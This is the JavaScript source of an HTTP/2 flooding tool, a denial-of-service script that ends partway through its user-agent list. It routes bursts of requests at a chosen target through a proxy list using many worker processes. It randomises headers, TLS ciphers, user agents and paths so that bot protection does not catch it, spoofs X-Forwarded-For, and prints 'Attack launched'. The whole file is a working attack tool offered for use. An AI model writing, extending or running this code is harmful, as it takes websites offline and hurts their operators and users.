const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
],
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
]
language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
    'en-GB,en;q=0.9',
    'en-CA,en;q=0.9',
    'en-AU,en;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9',
    'fr-FR,fr;q=0.9',
    'it-IT,it;q=0.9',
    'ja-JP,ja;q=0.9',
    'ko-KR,ko;q=0.9',
    'pt-PT,pt;q=0.9',
    'es-MX,es;q=0.9',
    'zh-CN,zh;q=0.9, en;q=0.8',
    'ru-RU,ru;q=0.9, en;q=0.8',
    'ar-SA,ar;q=0.9',
    'hi-IN,hi;q=0.9',
    'id-ID,id;q=0.9',
    'ms-MY,ms;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'vi-VN,vi;q=0.9',
    'bn-BD,bn;q=0.9',
    'fa-IR,fa;q=0.9',
    'he-IL,he;q=0.9',
    'nl-NL,nl;q=0.9, en;q=0.8',
    'sv-SE,sv;q=0.9',
    'pl-PL,pl;q=0.9',
    'fi-FI,fi;q=0.9',
    'no-NO,no;q=0.9',
    'da-DK,da;q=0.9',
    'cs-CZ,cs;q=0.9',
    'hu-HU,hu;q=0.9',
    'ro-RO,ro;q=0.9',
    'sk-SK,sk;q=0.9',
    'bg-BG,bg;q=0.9',
    'hr-HR,hr;q=0.9',
    'sr-RS,sr;q=0.9',
    'lt-LT,lt;q=0.9',
    'lv-LV,lv;q=0.9',
    'et-EE,et;q=0.9',
    'el-GR,el;q=0.9',
    'uk-UA,uk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'mk-MK,mk;q=0.9',
    'bs-BA,bs;q=0.9',
    'is-IS,is;q=0.9',
    'mt-MT,mt;q=0.9',
    'ga-IE,ga;q=0.9',
    'cy-GB,cy;q=0.9',
    'eu-ES,eu;q=0.9',
    'ca-ES,ca;q=0.9',
    'gl-ES,gl;q=0.9',
    'af-ZA,af;q=0.9',
    'zu-ZA,zu;q=0.9',
    'xh-ZA,xh;q=0.9',
    'st-ZA,st;q=0.9',
    'tn-ZA,tn;q=0.9',
    'ss-ZA,ss;q=0.9',
    'nr-ZA,nr;q=0.9',
    've-ZA,ve;q=0.9',
    'ts-ZA,ts;q=0.9',
    'nd-ZW,nd;q=0.9',
    'sn-ZW,sn;q=0.9'
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
]
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`.red); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};

 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.log("Target: ".brightYellow + process.argv[2]);
    console.log("Duration: ".brightYellow + process.argv[3] + " seconds");
    console.log("Rate: ".brightYellow + process.argv[4] + " req/s");
    console.log("Threads: ".brightYellow + process.argv[5]);
    console.log("Proxy File: ".brightYellow + process.argv[6]);
    console.log("Attack launched".brightRed);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log(`Restarting in ${RESTART_DELAY} ms...`.brightCyan);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };


    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached: '.yellow + ramPercentage.toFixed(2) + '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }


 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; 
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(1000);
    connection.setKeepAlive(true, 1000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


 const Socker = new NetSocket();

 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

 function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length - 1)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    console.log(`Selected proxy: ${proxyAddr}`.green);
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    const nm = [
      "110.0.0.0",
      "111.0.0.0",
      "112.0.0.0",
      "113.0.0.0",
      "114.0.0.0",
      "115.0.0.0",
      "116.0.0.0",
      "117.0.0.0",
      "118.0.0.0",
      "119.0.0.0",
      ];
      const nmx = [
      "120.0",
      "119.0",
      "118.0",
      "117.0",
      "116.0",
      "115.0",
      "114.0",
      "113.0",
      "112.0",
      "111.0",
      ];
      const nmx1 = [
      "105.0.0.0",
      "104.0.0.0",
      "103.0.0.0",
      "102.0.0.0",
      "101.0.0.0",
      "100.0.0.0",
      "99.0.0.0",
      "98.0.0.0",
      "97.0.0.0",
      ];
      const sysos = [
      "Windows 1.01",
      "Windows 1.02",
      "Windows 1.03",
      "Windows 1.04",
      "Windows 2.01",
      "Windows 3.0",
      "Windows NT 3.1",
      "Windows NT 3.5",
      "Windows 95",
      "Windows 98",
      "Windows 2006",
      "Windows NT 4.0",
      "Windows 95 Edition",
      "Windows 98 Edition",
      "Windows Me",
      "Windows Business",
      "Windows XP",
      "Windows 7",
      "Windows 8",
      "Windows 10 version 1507",
      "Windows 10 version 1511",
      "Windows 10 version 1607",
      "Windows 10 version 1703",
      ];
      const winarch = [
      "x86-16",
      "x86-16, IA32",
      "IA-32",
      "IA-32, Alpha, MIPS",
      "IA-32, Alpha, MIPS, PowerPC",
      "Itanium",
      "x86_64",
      "IA-32, x86-64",
      "IA-32, x86-64, ARM64",
      "x86-64, ARM64",
      "ARMv4, MIPS, SH-3",
      "ARMv4",
      "ARMv5",
      "ARMv7",
      "IA-32, x86-64, Itanium",
      "IA-32, x86-64, Itanium",
      "x86-64, Itanium",
      ];
      const winch = [
      "2012 R2",
      "2019 R2",
      "2012 R2 Datacenter",
      "Server Blue",
      "Longhorn Server",
      "Whistler Server",
      "Shell Release",
      "Daytona",
      "Razzle",
      "HPC 2008",
      ];
      
       var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
       var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
       var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
       var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
       var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
       var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
        const rd = [
          "221988",
          "1287172",
          "87238723",
          "8737283",
          "8238232",
          "63535464",
          "121212",
        ];
         var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
         
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
 const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }
     const queryParams = [
      'language=vn',
      'language=vi',
      'lang=en',
      'lang=fr',
      'region=US',
      'region=EU',
      'q=' + randstr(5),
      'id=' + randstrs(8),
      'page=' + getRandomInt(1, 10),
      'sort=asc',
      'sort=desc',
      'filter=active',
      'filter=all'
    ];

     const rateHeaders = [
        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
        {"Access-Control-Request-Method": "GET"},
        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        { "origin": "https://" + parsedTarget.host},
        { "source-ip": randstr(5)  },
        { "data-return" :"false"},
        {"X-Forwarded-For" : parsedProxy[0]},
        {"NEL" : val},
        {"dnt" : "1" },
        { "A-IM": "Feed" },
        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
       {'Delta-Base' : '12340001'},
       {"te": "trailers"},
       {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
];
let headers = {
  ":authority": parsedTarget.host,
  ":scheme": "https",
  ":method": "GET",
  "pragma" : "no-cache",
  "upgrade-insecure-requests" : "1",
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "user-agent" : randomUA(),
}
let dynamicPath = parsedTarget.path;
if (dynamicPath === '/') {
  dynamicPath = '/' + randstr(getRandomInt(5, 15));
} else {
  const params = [];
  for (let i = 0; i < getRandomInt(1, 3); i++) {
    params.push(randomElement(queryParams));
  }
  dynamicPath += '?' + params.join('&');
}
headers[":path"] = dynamicPath;
 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 1
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) {
      console.log(`Proxy connection error: ${error}`.red);
      return runFlooder();
    }

    console.log(`Connected via proxy: ${proxyAddr}`.blue);
    connection.setKeepAlive(true, 1000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };



    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: ["h2"],
       ciphers: cipper,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 1000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
     
        headerTableSize: 65536,
        maxHeaderListSize : 32768,
        initialWindowSize: 15564991,
        maxFrameSize : 16384,
    },
});
createConnection: () => tlsConn,
client.settings({
  headerTableSize: 65536,
  maxHeaderListSize : 32768,
  initialWindowSize: 15564991,
  maxFrameSize : 16384,
});


client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
      console.log(`HTTP/2 connected to ${parsedTarget.host}`.cyan);
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
           
            const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
              
              
            }
const request = client.request({
      ...dynHeaders,
    }, {
      parent:0,
      exclusive: true,
      weight: 220,
    })
               .on('response', response => {
                   request.close();
                   request.destroy();
                  
                  return
               });
               request.end(); 
               

           }
       }, 500);
    });
    client.on("close", () => {
      console.log(`Connection closed`.yellow);
      client.destroy();
      tlsConn.destroy();
      connection.destroy();
      return
  });
  client.on("timeout", () => {
    console.log(`Connection timeout`.red);
    client.destroy();
    connection.destroy();
    return
});
  client.on("error", error => {
console.log(`Client error: ${error}`.red);
client.destroy();
connection.destroy();
return
});
});
}
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

function randomUA() {
  const osPlatforms = [
    'Windows NT 10.0; Win64; x64',
    'Windows NT 6.1; Win64; x64',
    'Macintosh; Intel Mac OS X 10_15_7',
    'X11; Linux x86_64',
    'X11; Ubuntu; Linux x86_64',
    'iPhone; CPU iPhone OS 14_0 like Mac OS X',
    'Windows NT 10.0; WOW64',
    'Windows NT 6.3; Win64; x64',
    'Macintosh; Intel Mac OS X 10_14_6',
    'X11; Linux i686',
    'X11; Fedora; Linux x86_64',
    'Android 10; K',
    'iPad; CPU OS 13_3 like Mac OS X',
    'Windows NT 5.1; Win64; x64',
    'Macintosh; Intel Mac OS X 10.15; rv:109.0',
    'X11; CrOS x86_64 13505.73.0',
    'Windows NT 10.0; ARM64',
    'Macintosh; Intel Mac OS X 11_2_3',
    'X11; Linux armv7l',
    'iPhone; CPU iPhone OS 15_0 like Mac OS X',
    'Windows NT 6.2; Win64; x64',
    'Macintosh; Intel Mac OS X 10_13_6',
    'X11; Ubuntu; Linux i686',
    'Android 11; Pixel 4',
    'Windows NT 10.0; Trident/7.0',
    'Macintosh; Intel Mac OS X 12_0_1',
    'X11; Linux ppc64',
    'iPad; CPU OS 14_4 like Mac OS X',
    'Windows NT 6.1; WOW64',
    'Macintosh; Intel Mac OS X 10_12_6',
    'X11; Linux x86_64; rv:78.0',
    'Android 9; SM-G960F',
    'Windows NT 10.0; Win64; x64; rv:91.0',
    'Macintosh; Intel Mac OS X 10_11_6',
    'X11; Ubuntu; Linux armv8l',
    'iPhone; CPU iPhone OS 13_3_1 like Mac OS X',
    'Windows NT 6.3; WOW64',
    'Macintosh; Intel Mac OS X 10_10_5',
    'X11; Linux i586',
    'Android 12; SM-A515F',
    'Windows NT 10.0; Win64; x64; rv:89.0',
    'Macintosh; Intel Mac OS X 10_9_5',
    'X11; Linux x86_64-apple-darwin',
    'iPad; CPU OS 15_0 like Mac OS X',
    'Windows NT 6.0; Win64; x64',
    'Macintosh; Intel Mac OS X 10_8_5',
    'X11; Linux armv6l',
    'Android 8.1.0; Nexus 5X Build/OPM3.171019.014',
    'Windows NT 10.0; Win64; x64; rv:78.0',
    'Macintosh; Intel Mac OS X 10_7_5',
    'X11; Linux x86_64; rv:68.0',
    'iPhone; CPU iPhone OS 12_4_1 like Mac OS X',
    'Windows NT 6.1; Win64; x64; rv:56.0',
    'Macintosh; Intel Mac OS X 10_6_8',
    'X11; Ubuntu; Linux x86_64; rv:88.0',
    'Android 7.0; LG-H830 Build/NRD90U',
    'Windows NT 10.0; Win64; x64; rv:102.0',
    'Macintosh; Intel Mac OS X 10_15_6',
    'X11; Linux i686 on x86_64',
    'iPad; CPU OS 12_2 like Mac OS X',
    'Windows NT 6.2; WOW64',
    'Macintosh; Intel Mac OS X 10_14_5',
    'X11; Fedora; Linux i686',
    'Android 10; SM-G973F',
    'Windows NT 5.1; rv:52.0',
    'Macintosh; Intel Mac OS X 10_13_5',
    'X11; Linux x86_64; rv:91.0',
    'iPhone; CPU iPhone OS 14_4 like Mac OS X',
    'Windows NT 6.3; Win64; x64; rv:78.0',
    'Macintosh; Intel Mac OS X 10_12_5',
    'X11; Ubuntu; Linux i686; rv:78.0',
    'Android 11; Pixel 5',
    'Windows NT 10.0; rv:91.0',
    'Macintosh; Intel Mac OS X 10_11_5',
    'X11; Linux arm64',
    'iPad; CPU OS 13_5 like Mac OS X',
    'Windows NT 6.1; rv:68.0',
    'Macintosh; Intel Mac OS X 10_10_4',
    'X11; Linux x86_64; rv:102.0',
    'Android 9; Pixel 3 XL',
    'Windows NT 10.0; Win64; x64; rv:99.0',
    'Macintosh; Intel Mac OS X 10_15_5',
    'X11; Ubuntu; Linux armv7l',
    'iPhone; CPU iPhone OS 15_1 like Mac OS X',
    'Windows NT 6.0; WOW64',
    'Macintosh; Intel Mac OS X 10_9_4',
    'X11; Linux i686; rv:68.0',
    'Android 8.0.0; SM-G950F Build/R16NW',
    'Windows NT 5.2; Win64; x64',
    'Macintosh; Intel Mac OS X 10_8_4',
    'X11; Linux ppc',
    'iPad; CPU OS 14_0 like Mac OS X',
    'Windows NT 6.4; Win64; x64',
    'Macintosh; Intel Mac OS X 10_14_4',
    'X11; Linux x86_64; rv:78.0',
    'Android 12; Pixel 6'
  ];
  const browsers = [
    'Chrome/114.0.0.0 Safari/537.36',
    'Firefox/113.0',
    'Safari/537.36',
    'Edg/114.0.1823.58',
    'OPR/99.0.0.0',
    'Chrome/113.0.0.0 Safari/537.36',
    'Firefox/112.0',
    'Safari/537.35',
    'Edg/113.0.1774.57',
    'OPR/98.0.0.0',
    'Chrome/112.0.0.0 Safari/537.36',
    'Firefox/111.0',
    'Safari/537.34',
    'Edg/112.0.1722.68',
    'OPR/97.0.0.0',
    'Chrome/111.0.0.0 Safari/537.36',
    'Firefox/110.0',
    'Safari/537.33',
    'Edg/111.0.1661.62',
    'OPR/96.0.0.0',
    'Chrome/110.0.0.0 Safari/537.36',
    'Firefox/109.0',
    'Safari/537.32',
    'Edg/110.0.1587.69',
    'OPR/95.0.0.0',
    'Chrome/109.0.0.0 Safari/537.36',
    'Firefox/108.0',
    'Safari/537.31',
    'Edg/109.0.1518.78',
    'OPR/94.0.0.0',
    'Chrome/108.0.0.0 Safari/537.36',
    'Firefox/107.0',
    'Safari/537.30',
    'Edg/108.0.1462.76',
    'OPR/93.0.0.0',
    'Chrome/107.0.0.0 Safari/537.36',
    'Firefox/106.0',
    'Safari/537.29',
    'Edg/107.0.1418.62',
    'OPR/92.0.0.0',
    'Chrome/106.0.0.0 Safari/537.36',
    'Firefox/105.0',
    'Safari/537.28',
    'Edg/106.0.1370.52',
    'OPR/91.0.0.0',
    'Chrome/105.0.0.0 Safari/537.36',
    'Firefox/104.0',
    'Safari/537.27',
    'Edg/105.0.1343.53',
    'OPR/90.0.0.0',
    'Chrome/104.0.0.0 Safari/537.36',
    'Firefox/103.0',
    'Safari/537.26',
    'Edg/104.0.1293.70',
    'OPR/89.0.0.0',
    'Chrome/103.0.0.0 Safari/537.36',
    'Firefox/102.0',
